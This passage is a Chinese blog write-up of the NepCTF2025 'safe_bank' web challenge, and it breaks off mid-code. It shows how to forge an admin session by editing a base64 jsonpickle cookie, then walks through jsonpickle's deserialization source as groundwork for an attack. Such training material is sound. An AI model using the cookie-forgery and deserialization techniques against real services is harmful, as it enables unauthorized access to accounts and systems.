<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言至于为什么要写这篇文章呢？因为我认为这算是一个很高质量的题目，况且对于我对python并不熟悉来说，我们需要深入源码去分析才能做到更好的理解，所以打算单开一篇文章写这个题的思路和过程 原来不是flag？1欢迎来到全世界最安全的银行系统！我们采用了最先进的安保系统来保护您的账户。但最近有传言说，即使是最安全的系统也可能存在漏洞。你能绕过我们的安全措施，进入金库获取宝藏吗？  打开题目是一个登录口">
<meta property="og:type" content="article">
<meta property="og:title" content="Nepctf2025 safe_bank深究">
<meta property="og:url" content="https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="前言至于为什么要写这篇文章呢？因为我认为这算是一个很高质量的题目，况且对于我对python并不熟悉来说，我们需要深入源码去分析才能做到更好的理解，所以打算单开一篇文章写这个题的思路和过程 原来不是flag？1欢迎来到全世界最安全的银行系统！我们采用了最先进的安保系统来保护您的账户。但最近有传言说，即使是最安全的系统也可能存在漏洞。你能绕过我们的安全措施，进入金库获取宝藏吗？  打开题目是一个登录口">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730145809452.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730150038518.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730150209535.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730150324904.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730152512419.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730152538424.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730160910265.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804105304724.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804110503048.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804111243251.png">
<meta property="og:image" content="https://wanth3f1ag.top/2025/08/04/image/achieve/202411/NepCTF2025/image-20250804112907139.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804113004421.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804113200615.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804114414571.png">
<meta property="og:image" content="https://wanth3f1ag.top/2025/08/04/image/achieve/202411/NepCTF2025/image-20250804145550776.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804145721516.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804151456191.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804151555886.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804151833193.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804155407712.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804160243842.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250804160337646.png">
<meta property="article:published_time" content="2025-08-04T06:55:52.000Z">
<meta property="article:modified_time" content="2025-08-04T08:58:03.477Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="NepCTF2025">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/NepCTF2025/image-20250730145809452.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Nepctf2025 safe_bank深究</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/08/05/Java%E4%B9%8BSpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/07/31/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&text=Nepctf2025 safe_bank深究"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&is_video=false&description=Nepctf2025 safe_bank深究"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Nepctf2025 safe_bank深究&body=Check out this article: https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&title=Nepctf2025 safe_bank深究"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&name=Nepctf2025 safe_bank深究&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/04/Nepctf2025-safe-bank%E6%B7%B1%E7%A9%B6/&t=Nepctf2025 safe_bank深究"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E6%9D%A5%E4%B8%8D%E6%98%AFflag%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">原来不是flag？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E7%A9%B6%E6%BA%90%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">深究源码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#py-object"><span class="toc-number">3.1.</span> <span class="toc-text">py&#x2F;object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py-newargs%E5%92%8Cpy-newargsex"><span class="toc-number">3.2.</span> <span class="toc-text">py&#x2F;newargs和py&#x2F;newargsex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">payload总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">4.</span> <span class="toc-text">初次尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9A%E7%A7%AF%E8%96%84%E5%8F%91"><span class="toc-number">5.</span> <span class="toc-text">厚积薄发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%B8%85%E7%90%86%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">5.1.</span> <span class="toc-text">方法一：清理黑名单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9Amap%E7%B1%BB%E8%A7%A6%E5%8F%91"><span class="toc-number">5.2.</span> <span class="toc-text">方法二：map类触发</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Nepctf2025 safe_bank深究
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-08-04T06:55:52.000Z" class="dt-published" itemprop="datePublished">2025-08-04</time>
        
        (Updated: <time datetime="2025-08-04T08:58:03.477Z" class="dt-updated" itemprop="dateModified">2025-08-04</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E8%B5%9B%E9%A2%98wp/">赛题wp</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/NepCTF2025/" rel="tag">NepCTF2025</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>至于为什么要写这篇文章呢？因为我认为这算是一个很高质量的题目，况且对于我对python并不熟悉来说，我们需要深入源码去分析才能做到更好的理解，所以打算单开一篇文章写这个题的思路和过程</p>
<h2 id="原来不是flag？"><a href="#原来不是flag？" class="headerlink" title="原来不是flag？"></a>原来不是flag？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到全世界最安全的银行系统！我们采用了最先进的安保系统来保护您的账户。但最近有传言说，即使是最安全的系统也可能存在漏洞。你能绕过我们的安全措施，进入金库获取宝藏吗？</span><br></pre></td></tr></table></figure>

<p>打开题目是一个登录口，在&#x2F;about下有提示</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730145809452.png" alt="image-20250730145809452"></p>
<p>从这里可以得出几个信息，这里的话是python的flask框架开发的web应用，然后是用json进行数据传输的，在会话管理方面是用的jsonpickle去进行传输token的。</p>
<p>话不多说，我们先注册个账号进去看一下</p>
<p>admin用户存在？我们换个1111&#x2F;111111注册一下（要求用户名大于4位，密码大于6位）</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730150038518.png" alt="image-20250730150038518"></p>
<p>提示需要管理员权限才能访问，那么就需要伪造admin身份了，直接看cookie的结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authz=eyJweS9vYmplY3QiOiAiX19tYWluX18uU2Vzc2lvbiIsICJtZXRhIjogeyJ1c2VyIjogIjExMTEiLCAidHMiOiAxNzUzODU4ODMyfX0=</span><br></pre></td></tr></table></figure>

<p>之前提示是base64编码的，拿去解码一下</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730150209535.png" alt="image-20250730150209535"></p>
<p>明了了，user就是我们刚刚注册的用户名，我们改成admin试一下，一开始以为需要注意后面的时间戳的，但是好像貌似不需要？</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730150324904.png" alt="image-20250730150324904"></p>
<p>拿到管理员身份了，但是保险库中是一个假的flag。。。好吧，挖了个坑</p>
<h2 id="深究源码"><a href="#深究源码" class="headerlink" title="深究源码"></a>深究源码</h2><p>因为是提示了jsonpickle，所以去先知社区翻了一下文章</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16133">从源码看JsonPickle反序列化利用与绕WAF</a></p>
<p>从里面可以看到jsonpickle的反序列化恢复对象其实是基于本身定义的一些标签去进行的。话不多说，直接拖一个源码下来分析一下</p>
<p><a target="_blank" rel="noopener" href="https://github.com/jsonpickle/jsonpickle">https://github.com/jsonpickle/jsonpickle</a></p>
<p><code>jsonpickle/tags.py</code>文件下有反序列化支持的标签，标签对应的处理函数见<code>jsonpickle/unpickler.py</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tags.py</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;The jsonpickle.tags module provides the custom tags</span></span><br><span class="line"><span class="string">used for pickling and unpickling Python objects.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">These tags are keys into the flattened dictionaries</span></span><br><span class="line"><span class="string">created by the Pickler class.  The Unpickler uses</span></span><br><span class="line"><span class="string">these custom key names to identify dictionaries</span></span><br><span class="line"><span class="string">that need to be specially handled.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">BYTES: <span class="built_in">str</span> = <span class="string">&#x27;py/bytes&#x27;</span></span><br><span class="line">B64: <span class="built_in">str</span> = <span class="string">&#x27;py/b64&#x27;</span></span><br><span class="line">B85: <span class="built_in">str</span> = <span class="string">&#x27;py/b85&#x27;</span></span><br><span class="line">FUNCTION: <span class="built_in">str</span> = <span class="string">&#x27;py/function&#x27;</span></span><br><span class="line">ID: <span class="built_in">str</span> = <span class="string">&#x27;py/id&#x27;</span></span><br><span class="line">INITARGS: <span class="built_in">str</span> = <span class="string">&#x27;py/initargs&#x27;</span></span><br><span class="line">ITERATOR: <span class="built_in">str</span> = <span class="string">&#x27;py/iterator&#x27;</span></span><br><span class="line">JSON_KEY: <span class="built_in">str</span> = <span class="string">&#x27;json://&#x27;</span></span><br><span class="line">MODULE: <span class="built_in">str</span> = <span class="string">&#x27;py/mod&#x27;</span></span><br><span class="line">NEWARGS: <span class="built_in">str</span> = <span class="string">&#x27;py/newargs&#x27;</span></span><br><span class="line">NEWARGSEX: <span class="built_in">str</span> = <span class="string">&#x27;py/newargsex&#x27;</span></span><br><span class="line">NEWOBJ: <span class="built_in">str</span> = <span class="string">&#x27;py/newobj&#x27;</span></span><br><span class="line">OBJECT: <span class="built_in">str</span> = <span class="string">&#x27;py/object&#x27;</span></span><br><span class="line">PROPERTY: <span class="built_in">str</span> = <span class="string">&#x27;py/property&#x27;</span></span><br><span class="line">REDUCE: <span class="built_in">str</span> = <span class="string">&#x27;py/reduce&#x27;</span></span><br><span class="line">REF: <span class="built_in">str</span> = <span class="string">&#x27;py/ref&#x27;</span></span><br><span class="line">REPR: <span class="built_in">str</span> = <span class="string">&#x27;py/repr&#x27;</span></span><br><span class="line">SEQ: <span class="built_in">str</span> = <span class="string">&#x27;py/seq&#x27;</span></span><br><span class="line">SET: <span class="built_in">str</span> = <span class="string">&#x27;py/set&#x27;</span></span><br><span class="line">STATE: <span class="built_in">str</span> = <span class="string">&#x27;py/state&#x27;</span></span><br><span class="line">TUPLE: <span class="built_in">str</span> = <span class="string">&#x27;py/tuple&#x27;</span></span><br><span class="line">TYPE: <span class="built_in">str</span> = <span class="string">&#x27;py/type&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># All reserved tag names</span></span><br><span class="line">RESERVED: <span class="built_in">set</span> = &#123;</span><br><span class="line">    BYTES,</span><br><span class="line">    FUNCTION,</span><br><span class="line">    ID,</span><br><span class="line">    INITARGS,</span><br><span class="line">    ITERATOR,</span><br><span class="line">    MODULE,</span><br><span class="line">    NEWARGS,</span><br><span class="line">    NEWARGSEX,</span><br><span class="line">    NEWOBJ,</span><br><span class="line">    OBJECT,</span><br><span class="line">    PROPERTY,</span><br><span class="line">    REDUCE,</span><br><span class="line">    REF,</span><br><span class="line">    REPR,</span><br><span class="line">    SEQ,</span><br><span class="line">    SET,</span><br><span class="line">    STATE,</span><br><span class="line">    TUPLE,</span><br><span class="line">    TYPE,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化的流程，先看decode函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params"></span></span><br><span class="line"><span class="params">    string: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    backend: <span class="type">Optional</span>[JSONBackend] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    <span class="comment"># we get a lot of errors when typing with TypeVar</span></span></span><br><span class="line"><span class="params">    context: <span class="type">Optional</span>[<span class="string">&quot;Unpickler&quot;</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    keys: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    reset: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    safe: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    classes: <span class="type">Optional</span>[ClassesType] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    v1_decode: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    on_missing: MissingHandler = <span class="string">&#x27;ignore&#x27;</span>,</span></span><br><span class="line"><span class="params">    handle_readonly: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Any</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(on_missing, <span class="built_in">str</span>):</span><br><span class="line">        on_missing = on_missing.lower()</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> util._is_function(on_missing):</span><br><span class="line">        warnings.warn(</span><br><span class="line">            <span class="string">&quot;Unpickler.on_missing must be a string or a function! It will be ignored!&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    backend = backend <span class="keyword">or</span> json</span><br><span class="line">    context = context <span class="keyword">or</span> Unpickler(</span><br><span class="line">        keys=keys,</span><br><span class="line">        backend=backend,</span><br><span class="line">        safe=safe,</span><br><span class="line">        v1_decode=v1_decode,</span><br><span class="line">        on_missing=on_missing,</span><br><span class="line">        handle_readonly=handle_readonly,</span><br><span class="line">    )</span><br><span class="line">    data = backend.decode(string)</span><br><span class="line">    <span class="keyword">return</span> context.restore(data, reset=reset, classes=classes)</span><br></pre></td></tr></table></figure>

<p>解释一下几个重要参数：</p>
<ul>
<li><p>string: 要解码的 JSON 字符串。</p>
</li>
<li><p>keys: 如果设置为True，则jsonpickle将解码非字符串类型的字典键</p>
</li>
<li><p>backend: 指定一个解码后端（<code>JSONBackend</code>）。如果未提供，默认为 <code>json</code></p>
</li>
<li><p>safe:一个非常重要的安全开关。如果为 False，它会使用 eval() 来恢复某些旧格式的对象，这存在安全风险，可能被用来执行恶意代码。<strong>默认为 True，即安全模式</strong>。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = backend.decode(string)</span><br></pre></td></tr></table></figure>

<p>这里的话利用backend的decode方法先将传入的字符串进行解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> context.restore(data, reset=reset, classes=classes)</span><br></pre></td></tr></table></figure>

<p>调用context的restore方法去将解码后的数据恢复成python对象。然后我们继续根据restore</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730152512419.png" alt="image-20250730152512419"></p>
<p>继续跟进_restore</p>
<p><img src="/../image/achieve/202411/NepCTF2025/image-20250730152538424.png" alt="image-20250730152538424"></p>
<p>如果 <code>obj</code> 是字符串、列表、字典、集合或元组中的一种，程序会调用 <code>self._restore_tags(obj)</code>，继续跟进</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_restore_tags</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self, obj: <span class="type">Any</span>, _passthrough: <span class="type">Callable</span>[[<span class="type">Any</span>], <span class="type">Any</span>] = _passthrough</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Callable</span>[[<span class="type">Any</span>], <span class="type">Any</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return the restoration function for the specified object&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> tags.RESERVED &lt;= <span class="built_in">set</span>(obj) <span class="keyword">and</span> <span class="built_in">type</span>(obj) <span class="keyword">not</span> <span class="keyword">in</span> (<span class="built_in">list</span>, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">return</span> _passthrough</span><br><span class="line">    <span class="keyword">except</span> TypeError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(obj) <span class="keyword">is</span> <span class="built_in">dict</span>:</span><br><span class="line">        <span class="keyword">if</span> tags.TUPLE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_tuple</span><br><span class="line">        <span class="keyword">elif</span> tags.SET <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_set  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">        <span class="keyword">elif</span> tags.B64 <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_base64  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">        <span class="keyword">elif</span> tags.B85 <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_base85  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">        <span class="keyword">elif</span> tags.ID <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_id</span><br><span class="line">        <span class="keyword">elif</span> tags.ITERATOR <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_iterator  <span class="comment"># type: ignore[assignment]</span></span><br><span class="line">        <span class="keyword">elif</span> tags.OBJECT <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_object</span><br><span class="line">        <span class="keyword">elif</span> tags.TYPE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_type</span><br><span class="line">        <span class="keyword">elif</span> tags.REDUCE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_reduce</span><br><span class="line">        <span class="keyword">elif</span> tags.FUNCTION <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_function</span><br><span class="line">        <span class="keyword">elif</span> tags.MODULE <span class="keyword">in</span> obj:</span><br><span class="line">            restore = <span class="variable language_">self</span>._restore_module</span><br><span class="line">        <span class="keyword">elif</span> tags.REPR <span class="keyword">in</span> obj:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable 